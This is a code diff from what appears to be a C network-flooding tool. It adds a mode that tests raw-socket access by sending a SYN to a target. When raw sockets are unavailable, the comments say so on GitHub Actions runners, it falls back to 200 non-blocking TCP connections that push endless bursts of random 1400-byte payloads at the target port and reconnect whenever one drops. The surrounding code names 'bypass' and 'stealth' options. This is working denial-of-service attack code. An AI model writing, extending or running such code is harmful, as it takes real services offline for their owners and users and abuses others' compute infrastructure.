@@ -1662,7 +1662,153 @@ void *worker_thread(void *arg) {
         }
     }
     if (args.is_v17_tcp_bypass) {
-        // === V18 TCP BYPASS ENGINE (Raw Socket) ===
+        // === AUTO-DETECT: Raw socket vs SOCK_STREAM ===
+        // GitHub Actions blocks raw packets → auto-fallback to SOCK_STREAM
+        int use_raw = 0;
+        {
+            int tfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+            if (tfd >= 0) {
+                int h = 1; setsockopt(tfd, IPPROTO_IP, IP_HDRINCL, &h, sizeof(h));
+                // Build minimal test packet (SYN to target)
+                unsigned char tpkt[40];
+                memset(tpkt, 0, sizeof(tpkt));
+                struct iphdr *tip = (struct iphdr*)tpkt;
+                tip->ihl = 5; tip->version = 4; tip->tot_len = htons(40);
+                tip->ttl = 64; tip->protocol = IPPROTO_TCP;
+                tip->saddr = get_local_ip(); tip->daddr = bin_target_ip;
+                struct sockaddr_in tdst = {0};
+                tdst.sin_family = AF_INET; tdst.sin_addr.s_addr = bin_target_ip;
+                int r = sendto(tfd, tpkt, 40, 0, (struct sockaddr*)&tdst, sizeof(tdst));
+                if (r > 0) use_raw = 1;
+                close(tfd);
+            }
+            if (tid == 0) {
+                LOG_INFO("T%d: Raw socket test: %s", tid, use_raw ? "OK → Raw mode" : "FAIL → SOCK_STREAM mode");
+                fflush(stdout);
+            }
+        }
+        
+        if (!use_raw) {
+            // === SOCK_STREAM FALLBACK (GitHub Actions compatible) ===
+            #define RT_CONNS 200
+            #define RT_PL 1400
+            #define RT_SNDBUF (16*1024*1024)
+            #define RT_MAX_BYTES (512*1024)
+            #define RT_EPOLL_SZ 256
+            
+            unsigned char *rt_pl = malloc(RT_PL);
+            for (int i = 0; i < RT_PL; i++) rt_pl[i] = fast_rand() & 0xFF;
+            
+            int rt_fds[RT_CONNS];
+            int rt_st[RT_CONNS];
+            unsigned int rt_sn[RT_CONNS];
+            int rt_epfd = epoll_create1(0);
+            
+            struct sockaddr_in rt_dst;
+            memset(&rt_dst, 0, sizeof(rt_dst));
+            rt_dst.sin_family = AF_INET;
+            rt_dst.sin_port = htons(args.port);
+            rt_dst.sin_addr.s_addr = bin_target_ip;
+            
+            for (int i = 0; i < RT_CONNS; i++) rt_fds[i] = -1;
+            
+            for (int i = 0; i < RT_CONNS; i++) {
+                int fd = socket(AF_INET, SOCK_STREAM, 0);
+                if (fd < 0) continue;
+                int fl = fcntl(fd, F_GETFL, 0);
+                fcntl(fd, F_SETFL, fl | O_NONBLOCK);
+                int one = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
+                int sb = RT_SNDBUF; setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));
+                connect(fd, (struct sockaddr*)&rt_dst, sizeof(rt_dst));
+                rt_fds[i] = fd; rt_st[i] = 0; rt_sn[i] = 0;
+                struct epoll_event ev;
+                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                ev.data.u32 = (unsigned int)i;
+                epoll_ctl(rt_epfd, EPOLL_CTL_ADD, fd, &ev);
+            }
+            
+            LOG_INFO("T%d: SOCK_STREAM engine, %d conns → %s:%d", tid, RT_CONNS,
+                     inet_ntoa(rt_dst.sin_addr), args.port);
+            fflush(stdout);
+            
+            struct epoll_event rt_evs[RT_EPOLL_SZ];
+            while (1) {
+                int nev = epoll_wait(rt_epfd, rt_evs, RT_EPOLL_SZ, 50);
+                if (nev < 0 && errno != EINTR) break;
+                
+                for (int e = 0; e < nev; e++) {
+                    unsigned int idx = rt_evs[e].data.u32;
+                    if (idx >= (unsigned int)RT_CONNS || rt_fds[idx] < 0) continue;
+                    int fd = rt_fds[idx];
+                    
+                    if (rt_evs[e].events & (EPOLLERR | EPOLLHUP)) {
+                        goto rt_reconn;
+                    }
+                    
+                    if (rt_evs[e].events & EPOLLOUT) {
+                        if (rt_st[idx] == 0) {
+                            int err = 0; socklen_t el = sizeof(err);
+                            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
+                            if (err) goto rt_reconn;
+                            rt_st[idx] = 1;
+                        }
+                        for (int burst = 0; burst < 32; burst++) {
+                            *((unsigned int*)rt_pl) = fast_rand();
+                            *((unsigned int*)(rt_pl+4)) = fast_rand();
+                            int s = send(fd, rt_pl, RT_PL, MSG_NOSIGNAL | MSG_DONTWAIT);
+                            if (s > 0) {
+                                rt_sn[idx] += s;
+                                thread_stats[tid].packets++;
+                                thread_stats[tid].bytes += s;
+                            } else {
+                                if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+                                goto rt_reconn;
+                            }
+                        }
+                        if (rt_sn[idx] > RT_MAX_BYTES) goto rt_reconn;
+                    }
+                    continue;
+                    
+                    rt_reconn:
+                    epoll_ctl(rt_epfd, EPOLL_CTL_DEL, fd, NULL);
+                    close(fd);
+                    fd = socket(AF_INET, SOCK_STREAM, 0);
+                    if (fd >= 0) {
+                        int fl2 = fcntl(fd, F_GETFL, 0);
+                        fcntl(fd, F_SETFL, fl2 | O_NONBLOCK);
+                        int one2 = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one2, sizeof(one2));
+                        int sb2 = RT_SNDBUF; setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sb2, sizeof(sb2));
+                        connect(fd, (struct sockaddr*)&rt_dst, sizeof(rt_dst));
+                        struct epoll_event ev2;
+                        ev2.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                        ev2.data.u32 = idx;
+                        epoll_ctl(rt_epfd, EPOLL_CTL_ADD, fd, &ev2);
+                    }
+                    rt_fds[idx] = fd; rt_st[idx] = 0; rt_sn[idx] = 0;
+                }
+                
+                // Reconnect dead
+                for (int i = 0; i < RT_CONNS; i++) {
+                    if (rt_fds[i] < 0) {
+                        int fd = socket(AF_INET, SOCK_STREAM, 0);
+                        if (fd < 0) continue;
+                        int fl3 = fcntl(fd, F_GETFL, 0);
+                        fcntl(fd, F_SETFL, fl3 | O_NONBLOCK);
+                        int one3 = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one3, sizeof(one3));
+                        connect(fd, (struct sockaddr*)&rt_dst, sizeof(rt_dst));
+                        struct epoll_event ev3;
+                        ev3.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
+                        ev3.data.u32 = (unsigned int)i;
+                        epoll_ctl(rt_epfd, EPOLL_CTL_ADD, fd, &ev3);
+                        rt_fds[i] = fd; rt_st[i] = 0; rt_sn[i] = 0;
+                    }
+                }
+            }
+            free(rt_pl); close(rt_epfd);
+            return NULL;
+        }
+        
+        // === RAW SOCKET ENGINE (VPS mode — raw test passed) ===
 
         int stealth = args.is_stealth;
         int nc=sysconf(_SC_NPROCESSORS_ONLN);
